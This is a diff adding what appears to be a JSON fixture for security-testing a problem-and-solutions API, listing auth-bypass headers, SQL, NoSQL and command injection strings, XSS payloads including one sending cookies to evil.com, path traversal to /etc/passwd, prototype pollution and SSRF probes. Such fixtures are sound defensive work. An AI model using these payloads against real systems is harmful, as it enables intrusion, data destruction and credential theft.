@@ -1,0 +1,255 @@
+{
+  "auth_bypass": {
+    "endpoints": [
+      {
+        "method": "POST",
+        "path": "/api/solutions",
+        "payload": {"problem_id": 1, "solution": {"h_values": [0.5]}}
+      },
+      {
+        "method": "POST",
+        "path": "/api/problems/erdos-min-overlap/threads",
+        "payload": {"title": "test", "body": "test"}
+      }
+    ],
+    "variants": [
+      {"name": "NONE", "headers": {}},
+      {"name": "EMPTY_BEARER", "headers": {"Authorization": "Bearer "}},
+      {"name": "INVALID_TOKEN", "headers": {"Authorization": "Bearer fake_token_12345"}},
+      {"name": "WRONG_SCHEME_BASIC", "headers": {"Authorization": "Basic dGVzdDp0ZXN0"}},
+      {"name": "WRONG_SCHEME_TOKEN", "headers": {"Authorization": "Token {api_key}"}},
+      {"name": "BEARER_LOWERCASE", "headers": {"authorization": "bearer {api_key}"}},
+      {"name": "DOUBLE_BEARER", "headers": {"Authorization": "Bearer Bearer {api_key}"}},
+      {"name": "BEARER_NO_SPACE", "headers": {"Authorization": "Bearer{api_key}"}},
+      {"name": "NULL_BYTE_TOKEN", "headers": {"Authorization": "Bearer \u0000{api_key}"}},
+      {"name": "WHITESPACE_TOKEN", "headers": {"Authorization": "Bearer  {api_key} "}},
+      {"name": "SQL_IN_TOKEN", "headers": {"Authorization": "Bearer ' OR '1'='1"}},
+      {"name": "COOKIE_AUTH", "headers": {"Cookie": "token={api_key}"}},
+      {"name": "X_API_KEY", "headers": {"X-API-Key": "{api_key}"}},
+      {"name": "API_KEY_PARAM", "headers": {"Api-Key": "{api_key}"}}
+    ],
+    "must_reject": ["NONE", "EMPTY_BEARER", "INVALID_TOKEN", "SQL_IN_TOKEN"]
+  },
+
+  "injection": {
+    "sql_slugs": [
+      "erdos-min-overlap' OR '1'='1",
+      "erdos-min-overlap'; DROP TABLE problems;--",
+      "erdos-min-overlap\" OR \"1\"=\"1",
+      "1 UNION SELECT * FROM agents--",
+      "erdos-min-overlap'; WAITFOR DELAY '0:0:5';--",
+      "erdos-min-overlap' OR 1=1--",
+      "erdos-min-overlap` OR 1=1--"
+    ],
+    "sql_params": [
+      "problem_id=1 OR 1=1",
+      "problem_id=1; DROP TABLE solutions;--",
+      "problem_id=1 UNION SELECT api_key FROM agents--",
+      "limit=-1",
+      "limit=99999999",
+      "problem_id=1&limit=1 UNION SELECT * FROM agents--"
+    ],
+    "nosql_payloads": [
+      {"problem_id": {"$gt": 0}, "solution": {"h_values": [0.5]}},
+      {"problem_id": {"$ne": null}, "solution": {"h_values": [0.5]}},
+      {"problem_id": 1, "solution": {"h_values": {"$gt": ""}}},
+      {"problem_id": 1, "solution": {"$where": "sleep(5000)"}}
+    ],
+    "command_injection": [
+      {"title": "test", "body": "; cat /etc/passwd"},
+      {"title": "test", "body": "$(whoami)"},
+      {"title": "test", "body": "`id`"},
+      {"title": "test", "body": "| ls -la /"},
+      {"title": "{{7*7}}", "body": "${7*7}"},
+      {"title": "test", "body": "__import__(\"os\").system(\"id\")"}
+    ],
+    "sql_leak_patterns": ["sql", "syntax", "mysql", "postgres", "sqlite", "error.*query", "column"],
+    "cmd_leak_patterns": ["root:", "uid=", "www-data", "nobody"]
+  },
+
+  "xss": {
+    "thread_payloads": [
+      {"title": "<script>alert(1)</script>", "body": "normal body"},
+      {"title": "test", "body": "<img src=x onerror=alert(1)>"},
+      {"title": "test", "body": "<svg onload=alert(1)>"},
+      {"title": "test", "body": "<iframe src=\"javascript:alert(1)\"></iframe>"},
+      {"title": "test", "body": "<a href=\"javascript:alert(1)\">click</a>"},
+      {"title": "test", "body": "<div style=\"background:url(javascript:alert(1))\">"},
+      {"title": "test", "body": "<math><mtext><table><mglyph><svg><mtext><textarea><path id=\"</textarea><img onerror=alert(1) src=1>\">"},
+      {"title": "test", "body": "{{constructor.constructor(\"return this.process.env\")()}}"},
+      {"title": "test", "body": "<details open ontoggle=alert(1)>"},
+      {"title": "test", "body": "\\u003cscript\\u003ealert(1)\\u003c/script\\u003e"}
+    ],
+    "registration_payloads": [
+      {"name": "<script>alert(1)</script>", "description": "test"},
+      {"name": "test\"><img src=x onerror=alert(1)>", "description": "test"},
+      {"name": "test", "description": "<script>document.location=\"http://evil.com/?c=\"+document.cookie</script>"}
+    ]
+  },
+
+  "malformed_input": {
+    "invalid_json_strings": [
+      "{",
+      "{{{}",
+      "not json at all",
+      "",
+      "{\"problem_id\": 1, \"solution\": }",
+      "{\"problem_id\": 1, \"solution\": undefined}",
+      "null",
+      "[]",
+      "\"just a string\"",
+      "42"
+    ],
+    "wrong_content_types": [
+      "text/plain",
+      "application/xml",
+      "multipart/form-data",
+      "application/x-www-form-urlencoded",
+      "text/html",
+      null
+    ],
+    "wrong_type_payloads": [
+      {"label": "string_problem_id", "payload": {"problem_id": "one", "solution": {"h_values": [0.5]}}},
+      {"label": "null_problem_id", "payload": {"problem_id": null, "solution": {"h_values": [0.5]}}},
+      {"label": "negative_problem_id", "payload": {"problem_id": -1, "solution": {"h_values": [0.5]}}},
+      {"label": "zero_problem_id", "payload": {"problem_id": 0, "solution": {"h_values": [0.5]}}},
+      {"label": "huge_problem_id", "payload": {"problem_id": 99999, "solution": {"h_values": [0.5]}}},
+      {"label": "float_problem_id", "payload": {"problem_id": 1.5, "solution": {"h_values": [0.5]}}},
+      {"label": "bool_problem_id", "payload": {"problem_id": true, "solution": {"h_values": [0.5]}}},
+      {"label": "null_solution", "payload": {"problem_id": 1, "solution": null}},
+      {"label": "string_solution", "payload": {"problem_id": 1, "solution": "string"}},
+      {"label": "string_h_values", "payload": {"problem_id": 1, "solution": {"h_values": "not an array"}}},
+      {"label": "null_h_values", "payload": {"problem_id": 1, "solution": {"h_values": null}}},
+      {"label": "empty_h_values", "payload": {"problem_id": 1, "solution": {"h_values": []}}},
+      {"label": "string_array", "payload": {"problem_id": 1, "solution": {"h_values": ["a", "b", "c"]}}},
+      {"label": "null_array", "payload": {"problem_id": 1, "solution": {"h_values": [null, null]}}},
+      {"label": "empty_solution_obj", "payload": {"problem_id": 1, "solution": {}}},
+      {"label": "missing_solution", "payload": {"problem_id": 1}},
+      {"label": "missing_problem_id", "payload": {"solution": {"h_values": [0.5]}}},
+      {"label": "empty_object", "payload": {}}
+    ],
+    "raw_edge_payloads": [
+      {"label": "infinity", "raw": "{\"problem_id\": 1, \"solution\": {\"h_values\": [Infinity]}}"},
+      {"label": "nan", "raw": "{\"problem_id\": 1, \"solution\": {\"h_values\": [NaN]}}"},
+      {"label": "huge_float", "raw": "{\"problem_id\": 1, \"solution\": {\"h_values\": [1e308]}}"},
+      {"label": "neg_huge_float", "raw": "{\"problem_id\": 1, \"solution\": {\"h_values\": [-1e308]}}"}
+    ],
+    "http_methods": ["PUT", "DELETE", "PATCH", "OPTIONS", "HEAD", "TRACE"],
+    "method_endpoints": ["/api/problems", "/api/solutions"]
+  },
+
+  "idor": {
+    "solution_ids": [1, 2, 3, 4, 5, 10, 100, 999],
+    "thread_ids": [1, 2, 3, 4, 5, 10, 100],
+    "sensitive_patterns": ["api_key", "password", "secret", "token", "email"],
+    "traversal_slugs": [
+      "../agents",
+      "../../etc/passwd",
+      "..%2f..%2fetc%2fpasswd",
+      "erdos-min-overlap/../../agents",
+      "..",
+      ".",
+      "%00",
+      "erdos-min-overlap%00.json",
+      "erdos-min-overlap/.."
+    ],
+    "hidden_paths": [
+      "/api/agents",
+      "/api/agents/1",
+      "/api/admin",
+      "/api/admin/agents",
+      "/api/internal",
+      "/api/config",
+      "/api/env",
+      "/api/debug",
+      "/api/graphql",
+      "/api/v2/problems",
+      "/api/health",
+      "/api/status",
+      "/api/metrics",
+      "/.env",
+      "/.env.local",
+      "/.git/config",
+      "/api/agents/register",
+      "/api/swagger",
+      "/api/docs",
+      "/api/openapi.json"
+    ]
+  },
+
+  "registration": {
+    "weird_names": [
+      "",
+      "  ",
+      "A",
+      "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA",
+      "<script>alert(\"xss\")</script>",
+      "admin",
+      "system",
+      "null",
+      "undefined",
+      "true",
+      "__proto__",
+      "constructor",
+      "../admin",
+      "{\"$gt\":\"\"}"
+    ],
+    "field_payloads": [
+      {},
+      {"name": "test"},
+      {"description": "test"},
+      {"name": "test", "description": "test", "admin": true},
+      {"name": "test", "description": "test", "api_key": "ea_custom_key"},
+      {"name": "test", "description": "test", "role": "admin"},
+      {"name": "test", "description": "test", "id": 1}
+    ],
+    "mass_count": 10
+  },
+
+  "prototype_pollution": {
+    "solution_payloads": [
+      {"problem_id": 1, "solution": {"h_values": [0.5]}, "__proto__": {"admin": true}},
+      {"problem_id": 1, "solution": {"h_values": [0.5]}, "constructor": {"prototype": {"admin": true}}},
+      {"problem_id": 1, "solution": {"h_values": [0.5], "__proto__": {"isAdmin": true}}},
+      {"problem_id": 1, "solution": {"h_values": [0.5]}, "prototype": {"role": "admin"}}
+    ],
+    "registration_payloads": [
+      {"name": "ProtoTest", "description": "test", "__proto__": {"role": "admin", "isAdmin": true}},
+      {"name": "ProtoTest2", "description": "test", "constructor": {"prototype": {"admin": true}}}
+    ],
+    "json_edge_cases": [
+      {"problem_id": 1, "solution": {"h_values": [0.5]}, "__duplicate_problem_id": 2},
+      {"problem_id": 1, "solution": {"h_values": [1e-324]}},
+      {"problem_id": 1, "solution": {"h_values": [1.7976931348623157e+308]}},
+      {"problem_id": 1, "solution": {"h_values": [-0.0]}}
+    ],
+    "duplicate_key_raw": [
+      "{\"problem_id\":1,\"solution\":{\"h_values\":[0.5]},\"problem_id\":2}",
+      "{\"problem_id\":1,\"solution\":{\"h_values\":[0.5]},\"solution\":{\"h_values\":[999]}}"
+    ]
+  },
+
+  "ssrf": {
+    "header_tests": [
+      {"header": "Host", "value": "evil.com"},
+      {"header": "X-Forwarded-Host", "value": "evil.com"},
+      {"header": "X-Forwarded-For", "value": "127.0.0.1"},
+      {"header": "X-Real-IP", "value": "127.0.0.1"},
+      {"header": "X-Original-URL", "value": "/api/admin"}
+    ],
+    "cors_origins": [
+      "http://evil.com",
+      "https://evil.com",
+      "null",
+      "http://localhost:3000.evil.com",
+      "http://localhost:4000"
+    ],
+    "payloads": [
+      {"problem_id": 1, "solution": {"h_values": ["http://169.254.169.254/latest/meta-data/"]}},
+      {"problem_id": 1, "solution": {"h_values": ["http://localhost:5432"]}},
+      {"problem_id": 1, "solution": {"h_values": ["http://localhost:6379"]}},
+      {"problem_id": 1, "solution": {"url": "http://169.254.169.254/latest/meta-data/"}},
+      {"problem_id": 1, "solution": {"callback_url": "http://evil.com/steal"}}
+    ]
+  }
+}
